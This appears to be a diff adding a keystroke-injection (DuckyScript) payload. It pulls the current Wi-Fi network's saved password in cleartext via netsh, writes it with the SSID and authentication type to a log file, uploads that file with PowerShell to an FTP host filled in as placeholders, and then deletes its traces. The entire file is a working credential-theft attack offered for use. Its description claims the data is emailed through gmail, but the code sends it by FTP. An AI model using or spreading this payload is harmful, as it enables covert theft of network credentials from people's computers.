@@ -1,0 +1,41 @@
+REM Description: Saves the SSID, Network type, Authentication and the password to Log.txt and emails the contents of Log.txt from a gmail account.
+
+REM --> Minimize all windows
+GUI d
+>>>CMD<<<
+REM --> Getting SSID
+STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
+ENTER
+
+REM --> Creating A.txt
+STRING netsh wlan show profiles %A% key=clear | findstr /c:"Network type" /c:"Authentication" /c:"Key Content" | findstr /v "broadcast" | findstr /v "Radio">>A.txt
+ENTER
+
+REM --> Get network type
+STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" A.txt') do set B=%A
+ENTER
+
+REM --> Get authentication
+STRING for /f "tokens=2 delims=: " %A in ('findstr "Authentication" A.txt') do set C=%A
+ENTER
+
+REM --> Get password
+STRING for /f "tokens=3 delims=: " %A in ('findstr "Key Content" A.txt') do set D=%A
+ENTER
+
+REM --> Delete A.txt
+STRING del A.txt
+ENTER
+
+REM --> Create Log.txt
+STRING echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt
+ENTER
+
+REM --> Upload
+STRING powershell "$webclient = New-Object System.Net.WebClient;$webclient.Credentials = New-Object System.Net.NetworkCredential('>>>FTP USERNAME<<<', '>>>FTP PASSWORD<<<');$out = Get-Random; $webclient.UploadString('ftp://>>>FTP HOST<<</>>>OUTFILE<<< -WiFi $out.txt', (Get-Content Log.txt | out-string))"
+ENTER
+DELAY 1000
+
+REM --> Delete Log.txt and exit
+STRING del Log.txt & exit
+ENTER
